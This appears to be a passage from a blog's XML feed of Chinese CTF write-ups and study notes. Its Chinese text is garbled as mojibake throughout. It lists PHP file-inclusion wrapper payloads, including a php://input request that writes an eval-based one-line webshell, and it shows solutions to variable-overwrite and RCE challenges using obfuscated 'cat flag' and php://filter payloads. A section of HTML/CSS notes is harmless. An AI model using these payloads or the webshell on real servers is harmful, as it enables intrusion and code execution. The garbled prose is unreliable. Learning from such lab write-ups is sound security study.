<td>åŒä¸Šï¼Œåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºbz2å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ã€‚</td></tr></table><table border="1"><tr>    <th>åŠ å¯†è¿‡æ»¤å™¨</th>    <th>ä½œç”¨</th></tr><tr>    <td>mcrypt*</td>    <td>libmcryptçš„å¯¹ç§°åŠ å¯†ç®—æ³•</td></tr><tr>    <td>mdecryot*</td>    <td>libmcryptçš„å¯¹ç§°è§£å¯†ç®—æ³•</td></tr></table><li>phpï¼š//filter/resource=[æ–‡ä»¶å]è¯»å–æ–‡ä»¶æºç <br>    file=phpï¼š//filter/resource=flag</li><li>php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]è¯»å–æ–‡ä»¶æºç ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰<br>   file=phpï¼š//filter/read=convert.base64.encode/resource=flag</li><li>php://input+[POST DATA]æ‰§è¡Œä»£ç <br>   ï¼Ÿfile=phpï¼š//input    [POST DATAéƒ¨åˆ†]&#60;?php phpinfo();?&#62;<br>    post dataåœ¨harkbarä¸­è¾“å…¥</li><li>è‹¥æœ‰æƒé™å¯å†™å…¥ä¸€å¥è¯æœ¨é©¬<br>    ?file=php://input<br>    [POST DATA]&#60;?php fputs(fopen('yijuhua.php''w'),'&#60;?php @eval($_GET[cmd]);?&#62;');?&#62;</li><h1>zipï¼š//&bzipï¼š//&zlibï¼š//</h1>   <li>æ¡ä»¶</li><br>      ä¸å—é™åˆ¶   <li>ä½œç”¨<br>     zipï¼š//&bzipï¼š//&zlibï¼š//å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼šipg png gif xxxç­‰<br>     zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#(%23)[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]<br>     åœ¨æ–‡ä»¶ä¸Šä¼ åœºæ™¯ä¸‹ï¼Œå‹ç¼©phpinfo.txtä¸ºphpinfo.zipï¼Œå‹ç¼©åŒ…é‡å‘½åä¸ºphpinfo.jpgå¹¶ä¸Šä¼      ï¼Ÿfile=zip://D:\phpstudy\WWW\phpinfo.jpg%23phpinfo.txt<br></li><em>ç±»ä¼¼</em>     å‹ç¼©phpinfo.txtä¸ºphpinfo.bz2å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰     ï¼Ÿfile=compress.bzip://D:\phpstudy\WWW\phpinfo.bz2<br>     å‹ç¼©phpinfo.txtä¸ºphpinfo.gzå¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰     ï¼Ÿfile=compress.zlibï¼š//Dï¼š\phpstude\WWW\phpinfp.gz<br><h1>phar://åè®®</h1>     åŒzipåè®®<br>     pharï¼š//[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]/[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]<br>     ï¼Ÿfile=phar://D:\phpstudy\WWW\phpinfo.zip\phpinfo.txt<br><h1>dataï¼š//</h1>  <li>æ¡ä»¶     allow_url_fopenï¼šon     allow_url_includeï¼šon  <li>ç¤ºä¾‹     dataï¼š//text/plainï¼Œ<br>     ?file=data://text/plain,&#60;?php%20phpinfo();?&#62;<br>     data://text/plain;base64,<br>     ?file=data://text/plain;base64,PD9waHAlMjBwaHBpbmZvKCk7Pz4=<h1>httpï¼š//&httpï¼š//</h1>  <li>æ¡ä»¶<br>  allow_url_fopen:on  allow_url_include:on  <li>ä½œç”¨<br>  å¸¸è§„urlå½¢å¼ï¼Œå…è®¸é€šè¿‡http1.0çš„GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚ç”¨äºè¿œç¨‹åŒ…å«ã€‚  <li>ï¼Ÿfile=httpï¼š//127.0.0.1/phpinfo.txt]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å˜é‡è¦†ç›–äºŒ</title>
      <link href="/2020/11/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%BA%8C/"/>
      <url>/2020/11/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>å˜é‡è¦†ç›–2</p><span id="more"></span><h1><font color="SlateGray">è¿˜æ˜¯è¦å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯å˜é‡è¦†ç›–</font></h1>          ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å‚æ•°å€¼æ¥æ›¿æ¢ç¨‹åºåŸæœ‰çš„å˜é‡å€¼<h2><font color="RosyBrown">å¥½å®¶ä¼™ï¼Œåˆšæ‹¿åˆ°é¢˜çš„æ—¶å€™è¿˜çœŸæ˜¯ä¸€è„¸æ‡µï¼Œçœ‹ä¸æ‡‚ä»£ç ï¼ŒQAQã€‚ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‚è€ƒå˜é‡è¦†ç›–å…¶ä»–é¢˜ç›®ï¼Œå¤§æ¦‚æ˜ç™½äº†æ˜¯ä»€ä¹ˆæ„æ€</font></h2><html><head> <meta charset="utf-8"> <title>å˜é‡è¦†ç›–</title> </head><body><div style="opacity:0.2;position:absolute;left:6px;width:900px;height:1000px;background-color:#40B3DF"></div><p>&#60;?php<br><br>highlight_file(<strong>FILE</strong>);<br><br>include â€œflag.phpâ€;//æœ‰ä¸ªflag.phpçš„æ–‡ä»¶ï¼Œé‡Œé¢æœ‰flag<br></p><p>$_403 = â€œæ‹’ç»è®¿é—®â€;<br><br>$_200 = â€œæ¬¢è¿~~~â€;<br></p><p>if ($_SERVER[â€œREQUEST_METHODâ€] != â€œPOSTâ€)<br><br>    die(â€œsssssssspostâ€¦â€);<br></p><p>if ( !isset($_POST[â€œflagâ€]) )<br><br>    die($_403);<br></p><p>foreach ($_GET as $key =&gt; $value)<br><br>    $$key = $$value;<br></p><p>foreach ($_POST as $key =&gt; $value)<br><br>    $$key = $value;//<font color="IndianRed">çœ‹åˆ°è¿™é‡Œï¼Œflagçš„å€¼è¢«è¦†ç›–ï¼Œå¦‚æœ$keyç­‰äºflagï¼Œåˆ™$$keyå°±ç­‰äº$flagï¼Œå¦‚æœ$$value=$cky,è€Œckyæ˜¯ä¸ªæœ‰å˜é‡çš„å€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥è®©$flag=$ckyï¼Œå¾—åˆ°flag</font><br></p><p>if ( $_POST[â€œflagâ€] !== $flag )<br><br>    die($_403);//<font color="IndianRed">çœ‹åˆ°è¿™é‡Œï¼Œæ•°ç»„å¾ªç¯é‚£ä¹ˆè¿™ä¸ªåˆ¤æ–­ä¸€å®šæ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥æ˜¯æ— æ³•è¿›å…¥_403</font><br></p><p>echo â€œThis is your flag : â€œ. $flag . â€œ\nâ€;<br><br>die($_200);//<font color="IndianRed">æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆæŠŠflagçš„å€¼èµ‹ç»™_200ç„¶åé€šè¿‡ï¼Œdie_200æŠŠflagçš„å€¼è¾“å…¥å‡ºæ¥</font><br></p><p>?&#62;</p></div></body></html><h1><font color="SlateGray">å¼€å§‹è§£é¢˜</font></h1><p>é¦–å…ˆæŠŠflagçš„å€¼èµ‹ç»™_200ï¼Œå°±æ˜¯ç”¨getçš„æ–¹å¼ï¼Œæ„é€ ï¼Ÿ_200=flag<br><br>ç„¶åç”¨postçš„æ–¹å¼ï¼Œèµ‹ç»™flagçš„å€¼ï¼Œflag=cky<br><br><img src="1.png" alt="1"><br><br><img src="2.png" alt="2"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>htmlå­¦ä¹ æŠ¥å‘Š</title>
      <link href="/2020/11/27/html%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2020/11/27/html%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>æ— </p><span id="more"></span><h1><font color="LightBlue">htmlçš„æ ‡é¢˜</font></h1>      htmlçš„æ ‡é¢˜æ˜¯é€šè¿‡&#60;h1&#62;-&#60;h6&#62;æ ‡ç­¾æ¥å®šä¹‰çš„ï¼Œ&#60;h1&#62;å®šä¹‰æœ€å¤§çš„æ ‡é¢˜ã€‚&#60;h6&#62;å®šä¹‰æœ€å°çš„æ ‡é¢˜<h1><font color="LightBlue">htmlçš„æ®µè½</font></h1>       <p>è¿™æ˜¯ç¬¬ä¸€æ®µ</p>       <p>è¿™æ˜¯ç¬¬äºŒæ®µ</p>å®é™…ä¸Šå®ƒæ˜¯é•¿è¿™æ ·çš„,æ˜¯è¿™æ ·çš„       &#60;p&#62;è¿™æ˜¯ç¬¬ä¸€æ®µ&#60;/&#62;        <br>       &#60;p&#62;è¿™æ˜¯ç¬¬äºŒæ®µ&#60;/&#62;<h1><font color="LightBlue"><b>html</b><em>æ–‡æœ¬</em><i>æ ¼å¼åŒ–</i></font></h1>      &#60;b&#62;        å®šä¹‰ç²—ä½“æ–‡æœ¬<br>      &#60;em&#62;        å®šä¹‰ç€é‡æ–‡å­—<br>      &#60;i&#62;        å®šä¹‰æ–œä½“å­—<br>      &#60;small&#62;   å®šä¹‰å°å·å­—<br>      &#60;strong&#62;  å®šä¹‰åŠ é‡è¯­æ°”<br>      &#60;sub&#62;     å®šä¹‰ä¸‹æ ‡å­—<br>      &#60;sup&#62;      å®šä¹‰ä¸Šæ ‡å­—<br>      &#60;ins&#62;        å®šä¹‰æ’å…¥å­—<br>      &#60;del&#62;        å®šä¹‰åˆ é™¤å­—<br><h1><font color="LightBlue ">htmlé“¾æ¥</font></h1><h2>è¯­æ³•æ˜¯è¿™æ ·çš„</h2>     &#60;a href="url"&#62;é“¾æ¥æ–‡æœ¬&#60;/a&#62;<br>    <a herf="ckylsy.github.io"target="_blank">ckyçš„åšå®¢</a><h2>targetå±æ€§</h2>      blank æ‰€æŒ‡æµè§ˆå™¨æ€»åœ¨ä¸€ä¸ªæ–°æ‰“å¼€çš„ï¼Œæœªå‘½åçš„çª—å£ä¸­è½½å…¥ç›®æ ‡æ–‡æ¡£ã€‚<br>      &#60;a herf="ckylsy.github.io"target="_blank"&#62;åšå®¢&#60;/a&#62;<br>      self åœ¨ç›¸åŒçš„æ¡†æ¶ä¸­æ‰“å¼€è¢«é“¾æ¥çš„æ–‡æ¡£<br>      parent åœ¨çˆ¶æ¡†æ¶é›†ä¸­æ‰“å¼€è¢«é“¾æ¥çš„æ–‡æ¡£<br>      top åœ¨æ•´ä¸ªçª—å£ä¸­æ‰“å¼€è¢«é“¾æ¥çš„æ–‡æ¡£<br><h2>idå±æ€§</h2>      idå±æ€§å¯ç”¨äºåˆ›å»ºåœ¨ä¸€ä¸ªhtmlçš„ä¹¦ç­¾æ ‡å¿—ï¼Œä¸ä»¥ä»»ä½•ç‰¹æ®Šçš„æ–¹å¼æ˜¾ç¤º<h1><font color="LightBlue">htmlçš„å¤´éƒ¨</font></h1>å…ˆä»‹ç»headå¤´éƒ¨å¯æ’å…¥çš„å…ƒç´ æ ‡ç­¾      &#60ï¼›title&#62ï¼›  å®šä¹‰äº†æµè§ˆå™¨å·¥å…·æ çš„æ ‡é¢˜ï¼Œå½“ç½‘é¡µæ·»åŠ åˆ°æ”¶è—å¤¹æ—¶ï¼Œæ˜¾ç¤ºåœ¨æ”¶è—å¤¹ä¸­çš„æ ‡é¢˜ï¼Œæ˜¾ç¤ºåœ¨æœç´¢å¼•æ“ç»“æœé¡µé¢çš„æ ‡é¢˜<br>      &#60;base&#62;    æ ‡ç­¾æè¿°äº†åŸºæœ¬çš„é“¾æ¥åœ°å€/é“¾æ¥ç›®æ ‡ï¼Œè¯¥æ ‡ç­¾ä½œä¸ºHTMLæ–‡æ¡£ä¸­æ‰€æœ‰çš„é“¾æ¥æ ‡ç­¾çš„é»˜è®¤é“¾æ¥<br>      &#60;link&#62;   æ ‡ç­¾å®šä¹‰äº†æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºä¹‹é—´çš„å…³ç³»,æ ‡ç­¾é€šå¸¸ç”¨äºé“¾æ¥åˆ°æ ·å¼è¡¨<br>      &#60;style&#62; æ ‡ç­¾å®šä¹‰äº†HTMLæ–‡æ¡£çš„æ ·å¼æ–‡ä»¶å¼•ç”¨åœ°å€.åœ¨&#60;style&#62; å…ƒç´ ä¸­ä½ ä¹Ÿå¯ä»¥ç›´æ¥æ·»åŠ æ ·å¼æ¥æ¸²æŸ“ HTML æ–‡æ¡£.<br>      &#60;meta&#62;  æ ‡ç­¾æè¿°äº†ä¸€äº›åŸºæœ¬çš„å…ƒæ•°æ®ã€‚&#60;meta&#62; æ ‡ç­¾æä¾›äº†å…ƒæ•°æ®.å…ƒæ•°æ®ä¹Ÿä¸æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œä½†ä¼šè¢«æµè§ˆå™¨è§£æã€‚&#60;meta&#62;å…ƒç´ é€šå¸¸ç”¨äºæŒ‡å®šç½‘é¡µçš„æè¿°,å…³é”®è¯,æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´,ä½œè€…,å’Œå…¶ä»–å…ƒæ•°æ®ã€‚å…ƒæ•°æ®å¯ä»¥ä½¿ç”¨äºæµè§ˆå™¨ï¼ˆå¦‚ä½•æ˜¾ç¤ºå†…å®¹æˆ–é‡æ–°åŠ è½½é¡µé¢ï¼‰ï¼Œæœç´¢å¼•æ“ï¼ˆå…³é”®è¯ï¼‰ï¼Œæˆ–å…¶ä»–WebæœåŠ¡ã€‚<br>     &#60;script&#62;æ ‡ç­¾ç”¨äºåŠ è½½è„šæœ¬æ–‡ä»¶,å¦‚:JavaScript<br><h1><fong color="LightBlue">CSS</font></h1><br><html><head> <meta charset="utf-8"> <title>htmlå­¦ä¹ æŠ¥å‘Š</title> </head><body><div style="opacity:0.4;position:absolute;left:60px;width:369px;height:150px;background-color:#40B3DF"></div><div style="font-family:verdana;opacity:0.5;padding:20px;border-radius:10px;border:10px solid #CD853F;"><div style="opacity:0.3;position:absolute;left:120px;width:100px;height:200px;background-color:#8AC007"></div><h3>Look! c  k  y  </h3><div style="letter-spacing:12px;">cky</div><div style="color:#40B3DF;">CKY<span style="background-color:#B4009E;color:#ffffff;">cky</span></div><div style="color:#000000;">cky</div></div></body></html><p>ahhhè¿™æ˜¯ä»ç½‘ä¸Šå¸®è¿‡æ¥çš„ä¸€æ®µä»£ç ï¼Œçœ‹ç€æŒºå¥½çœ‹çš„<br><br>cssæ˜¯ä¸ºäº†æ›´å¥½çš„æ¸²æŸ“HTMLå…ƒç´ è€Œå¼•å…¥çš„<br></p><h2>å†…è”æ ·å¼</h2>å½“ç‰¹æ®Šçš„æ ·å¼éœ€è¦åº”ç”¨åˆ°ä¸ªåˆ«å…ƒç´ æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨å†…è”æ ·å¼ã€‚ ä½¿ç”¨å†…è”æ ·å¼çš„æ–¹æ³•æ˜¯åœ¨ç›¸å…³çš„æ ‡ç­¾ä¸­ä½¿ç”¨æ ·å¼å±æ€§ã€‚æ ·å¼å±æ€§å¯ä»¥åŒ…å«ä»»ä½• CSS å±æ€§ã€‚<br><font color="Gray">èƒŒæ™¯é¢œè‰²</font><br>    &#60;body style="background-color:yellow;"&#62;<br>    &#60;h2 style="background-color:red;"&#62;è¿™æ˜¯ä¸€ä¸ªæ ‡é¢˜&#60;/h2&#62;<br>    &#60;p style="background-color:green;"&#62;è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚&#60;/p&#62;<br>    &#60;/body&#62;<br><font color="Gray">å­—ä½“, å­—ä½“é¢œè‰² ï¼Œå­—ä½“å¤§å°</font><br>     æœ‰font-familyï¼ˆå­—ä½“ï¼‰ï¼Œcolorï¼ˆé¢œè‰²ï¼‰ï¼Œå’Œfont-sizeï¼ˆå­—ä½“å¤§å°ï¼‰å±æ€§æ¥å®šä¹‰å­—ä½“çš„æ ·å¼<br>    &#60;h1&#62; style="font-family:verdana;"&#62;ä¸€ä¸ªæ ‡é¢˜&#60;/h1&#62;<br>    &#60;p&#62; style="font-family:arial;color:red;font-size:20px;"&#60;ä¸€ä¸ªæ®µè½ã€‚&#60;/p&#62;<br><font color="Gray">å¤–è”æ ·å¼</font><br>    å½“æ ·å¼éœ€è¦è¢«åº”ç”¨åˆ°å¾ˆå¤šé¡µé¢çš„æ—¶å€™ï¼Œå¤–éƒ¨æ ·å¼è¡¨å°†æ˜¯ç†æƒ³çš„é€‰æ‹©ã€‚ä½¿ç”¨å¤–éƒ¨æ ·å¼è¡¨ï¼Œä½ å°±å¯ä»¥é€šè¿‡æ›´æ”¹ä¸€ä¸ªæ–‡ä»¶æ¥æ”¹å˜æ•´ä¸ªç«™ç‚¹çš„å¤–è§‚<br>&#60;head&#62;<br>&#60;link rel="stylesheet" type="text/css" href="mystyle.css"&#62;<br>&#60;/head&#62;<br><h1><font color="LightBlue">htmlå›¾åƒ</font></h1><font color="Gray">å›¾åƒæ ‡ç­¾ï¼ˆ&#60;img&#62;ï¼‰å’Œæºå±æ€§ï¼ˆSrc)</font><br>å®šäºå›¾åƒçš„è¯­æ³•æ˜¯    $#60;img src="url" alt="some_text"$#62;<br>    URL æŒ‡å­˜å‚¨å›¾åƒçš„ä½ç½®ã€‚alt å±æ€§ç”¨æ¥ä¸ºå›¾åƒå®šä¹‰ä¸€ä¸²é¢„å¤‡çš„å¯æ›¿æ¢çš„æ–‡æœ¬ã€‚<br><font color="Gray">å›¾åƒçš„é«˜åº¦ä¸å®½åº¦</font><br>    &#60;img src="åå­—.jpg" alt="æ–‡æœ¬" width="å®½åº¦" height="é«˜"&#62;<h1><font color="LightBlue">è¡¨æ ¼</font></h1>&#60;table border="1"&#62;<br>//è¡¨æ ¼ç”± &#60;table&#62;æ ‡ç­¾æ¥å®šä¹‰ã€‚    &#60;tr&#62;<br>//ç”±træ¥å®šä¹‰æ¯è¡Œåˆ«åˆ†ä¸ºçš„å•å…ƒæ ¼        &#60;th>Header 1&#60;/th&#62;<br>//thæ¥å®šäºè¡¨æ ¼è¡¨å¤´        &#60;th>Header 2&#60;/th&#62;<br>    &#60;/tr&#62;<br>    &#60;tr&#62;<br>        &#60;td>row 1, cell 1&#60;/td&#62;<br>//ç”±tdæ¥å®šä¹‰æ¯è¡Œ        &#60;td>row 1, cell 2&#60;/td&#62;<br>    &#60;/tr&#62;<br>    &#60;tr&#62;<br>        &#60;td&#62;row 2, cell 1&#60;/td&#62;<br>        &#60;td&#62;row 2, cell 2&#60;/td&#62;<br>     &#60;/tr&#62;<br>    &#60;/table&#62;<br><h1><font color="LightBlue">åˆ—è¡¨</font></h1>åˆ†ä¸ºæœ‰åºåˆ—è¡¨å’Œæ— åºåˆ—è¡¨<br>æ— åºåˆ—è¡¨æ˜¯ä¸€ä¸ªé¡¹ç›®çš„åˆ—è¡¨ï¼Œæ­¤åˆ—é¡¹ç›®ä½¿ç”¨ç²—ä½“åœ†ç‚¹ï¼ˆå…¸å‹çš„å°é»‘åœ†åœˆï¼‰è¿›è¡Œæ ‡è®°<br>     &#60;ul&#62;//æ˜¯ç”±ulå®šä¹‰<br>     &#60;li&#62;cky&#60;/li&#62;<br>     &#60;li&#62;cky&#60;/li&#62;<br>     &#60;/ul&#62;<br>      <ul>     <li>cky</li>     <li>cky</li>     </ul> æœ‰åºåˆ—è¡¨ä¹Ÿæ˜¯ä¸€åˆ—é¡¹ç›®ï¼Œåˆ—è¡¨é¡¹ç›®ä½¿ç”¨æ•°å­—è¿›è¡Œæ ‡è®°ã€‚&#60;ol&#62;<br>&#60;li&#62;cky&#60;/li&#62;<br>&#60;li&#62;cky&#60;/li&#62;<br>&#60;/ol&#62;//æœ‰åºåˆ—è¡¨å§‹äº&#60;ol&#62;æ ‡ç­¾ã€‚æ¯ä¸ªåˆ—è¡¨é¡¹å§‹äº&#60;li&#62;æ ‡ç­¾ã€‚ <br><ol><li>cky</li><li>cky</li></ol> <h1><font color="LightBlue">åŒºå—</font></h1><p>&#60;div&#62; å…ƒç´ æ˜¯å—çº§å…ƒç´ ï¼Œå®ƒå¯ç”¨äºç»„åˆå…¶ä»– HTML å…ƒç´ çš„å®¹å™¨ã€‚<br>&#60;div&#62;å…ƒç´ æ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºå®ƒå±äºå—çº§å…ƒç´ ï¼Œæµè§ˆå™¨ä¼šåœ¨å…¶å‰åæ˜¾ç¤ºæŠ˜è¡Œã€‚å¦‚æœä¸ CSS ä¸€åŒä½¿ç”¨ï¼Œ&#60;div&#62; å…ƒç´ å¯ç”¨äºå¯¹å¤§çš„å†…å®¹å—è®¾ç½®æ ·å¼å±æ€§ã€‚<br>&#60;div&#62; å…ƒç´ çš„å¦ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯æ–‡æ¡£å¸ƒå±€ã€‚å®ƒå–ä»£äº†ä½¿ç”¨è¡¨æ ¼å®šä¹‰å¸ƒå±€çš„è€å¼æ–¹æ³•ã€‚ä½¿ç”¨ &#60;table&#62; å…ƒç´ è¿›è¡Œæ–‡æ¡£å¸ƒå±€ä¸æ˜¯è¡¨æ ¼çš„æ­£ç¡®ç”¨æ³•ã€‚&#60;table&amp;&#62; å…ƒç´ çš„ä½œç”¨æ˜¯æ˜¾ç¤ºè¡¨æ ¼åŒ–çš„æ•°æ®.<br><br>&#60;span&#62; å…ƒç´ æ˜¯å†…è”å…ƒç´ ï¼Œå¯ç”¨ä½œæ–‡æœ¬çš„å®¹å™¨&#60;span&#62;å…ƒç´ ä¹Ÿæ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚å½“ä¸ CSS ä¸€åŒä½¿ç”¨&#60;span&#62; å…ƒç´ å¯ç”¨äºä¸ºéƒ¨åˆ†æ–‡æœ¬è®¾ç½®æ ·å¼å±æ€§ã€‚</p><h1><font color="LightBlue">è¡¨å•</font></h1>æ–‡æœ¬åŸŸé€šè¿‡&#60;input type="text"&#62; <input type="text">æ ‡ç­¾æ¥è®¾å®šï¼Œå½“ç”¨æˆ·è¦åœ¨è¡¨å•ä¸­é”®å…¥å­—æ¯ã€æ•°å­—ç­‰å†…å®¹æ—¶ï¼Œå°±ä¼šç”¨åˆ°æ–‡æœ¬åŸŸã€‚<br>å¯†ç å­—æ®µé€šè¿‡æ ‡ç­¾&#60;input type="password"&#62; <input type="password">æ¥å®šä¹‰<br>&#60;input type="radio"&#62; <input type="radio">æ ‡ç­¾å®šä¹‰äº†è¡¨å•å•é€‰æ¡†é€‰é¡¹<br>&#60;<brinput type="checkbox"&#62; <input type="checkbox">å®šä¹‰äº†å¤é€‰æ¡†. ç”¨æˆ·éœ€è¦ä»è‹¥å¹²ç»™å®šçš„é€‰æ‹©ä¸­é€‰å–ä¸€ä¸ªæˆ–è‹¥å¹²é€‰é¡¹ã€‚<br>&#60;input type="submit"&#62;<input type="submit"> å®šä¹‰äº†æäº¤æŒ‰é’®.å½“ç”¨æˆ·å•å‡»ç¡®è®¤æŒ‰é’®æ—¶ï¼Œè¡¨å•çš„å†…å®¹ä¼šè¢«ä¼ é€åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ã€‚è¡¨å•çš„åŠ¨ä½œå±æ€§å®šä¹‰äº†ç›®çš„æ–‡ä»¶çš„æ–‡ä»¶åã€‚ç”±åŠ¨ä½œå±æ€§å®šä¹‰çš„è¿™ä¸ªæ–‡ä»¶é€šå¸¸ä¼šå¯¹æ¥æ”¶åˆ°çš„è¾“å…¥æ•°æ®è¿›è¡Œç›¸å…³çš„å¤„ç†ã€‚<br><h1><font color="LightBlue">æ¡†æ¶</font></h1>iframeè¯­æ³•:&#60;iframe src="URL"&#62;&#60;/iframe&#62;<br>è¯¥URLæŒ‡å‘ä¸åŒçš„ç½‘é¡µ<h1><font color="LightBlue">è„šæœ¬</font></h1>&#60;script&#62; æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚ JavaScriptã€‚&#60;script&#62; å…ƒç´ æ—¢å¯åŒ…å«è„šæœ¬è¯­å¥ï¼Œä¹Ÿå¯é€šè¿‡ src å±æ€§æŒ‡å‘å¤–éƒ¨è„šæœ¬æ–‡ä»¶ã€‚&#60;noscript&#62; æ ‡ç­¾æä¾›æ— æ³•ä½¿ç”¨è„šæœ¬æ—¶çš„æ›¿ä»£å†…å®¹ï¼Œæ¯”æ–¹åœ¨æµè§ˆå™¨ç¦ç”¨è„šæœ¬æ—¶ï¼Œæˆ–æµè§ˆå™¨ä¸æ”¯æŒå®¢æˆ·ç«¯è„šæœ¬æ—¶ã€‚&#60;noscript&#62;å…ƒç´ å¯åŒ…å«æ™®é€š HTML é¡µé¢çš„ body å…ƒç´ ä¸­èƒ½å¤Ÿæ‰¾åˆ°çš„æ‰€æœ‰å…ƒç´ ã€‚åªæœ‰åœ¨æµè§ˆå™¨ä¸æ”¯æŒè„šæœ¬æˆ–è€…ç¦ç”¨è„šæœ¬æ—¶ï¼Œæ‰ä¼šæ˜¾ç¤º &#60;noscript&#62; å…ƒç´ ä¸­çš„å†…å®¹<h1><font color="CadetBlue ">å¤§ä½“ä¹Ÿå°±è¿™ä¹ˆå¤šäº†å§</font></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rce2</title>
      <link href="/2020/11/26/rce2/"/>
      <url>/2020/11/26/rce2/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>basic rce 2</p><pre><code>ç›´æ¥æ„é€ ï¼ŸRem=ï¼ˆ&quot;ca\t f\lag&quot;ï¼‰æˆ–è€…Rem=ï¼ˆ&quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;ï¼‰å°±å¯ä»¥å‡ºæ¥</code></pre><p><img src="5.png" alt="5"><br>ä½†æ˜¯åœ¨ç½‘ä¸Šçœ‹åˆ°äº†ä¸€ä¸ªæ¯”è¾ƒå‰å®³çš„åšæ³•<br></p><pre><code>?Rem=include $_GET[&quot;cky&quot;] ?&gt;&amp;cky=php://filter/read=convert.base64-encode/resource=flag&lt;br&gt;</code></pre><p>æ„é€ æ–‡ä»¶åŒ…å«ï¼Œ ?Rem=include $_GET[â€œckyâ€] ?&gt;åé¢çš„ï¼Ÿ&gt;æ˜¯è¦å°é—­ï¼ŒæŒ‰æˆ‘çš„ç†è§£æ˜¯å¯èƒ½ä¸å¯¹ï¼Œå°±æ˜¯ä¸ä¼šåœ¨è¿‡æ»¤äº†ï¼Œå› ä¸ºå¦‚æœè¦ä¼ªåè®®è¯»å–é‡Œé¢æ˜¯è¦æœ‰flagï¼Œ$_GET[â€œckyâ€]è¿™æ˜¯ä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯ä¸Šé¢è¯´çš„eval=<?php?>ï¼Œåé¢åœ¨ä¼ å…¥å€¼ã€‚<br></p><p><img src="1.png" alt="3"><br>ç„¶åbase64<br>è¿™é“é¢˜æˆ‘åˆšå¼€å§‹è¿˜æœ‰ä¸€ç‚¹çš„ç–‘é—®æ˜¯æ˜¯æ„é€ ï¼ŸRemè¿˜æ˜¯ï¼ŸRamï¼Œåæ¥å°è¯•ååªæœ‰Remå¯è¡Œï¼Œå°±æƒ³ä¸ºä»€ä¹ˆï¼Œä¸Šç½‘æŸ¥å‘ç°getä¼ å…¥çš„å‚æ•°åªæœ‰remï¼Œæ‰€ä»¥è¦ç”¨è¿™ä¸ªã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å˜é‡è¦†ç›–</title>
      <link href="/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>extractå˜é‡è¦†ç›–</p><span id="more"></span><p><img src="1.png" alt="1"><br>å…ˆäº†è§£ä¸‹é¢˜ç›®ä¸­å‡ºç°çš„å‡ ä¸ªå‡½æ•°<br>extractï¼ˆï¼‰</p><pre><code>1.ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨2.è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ 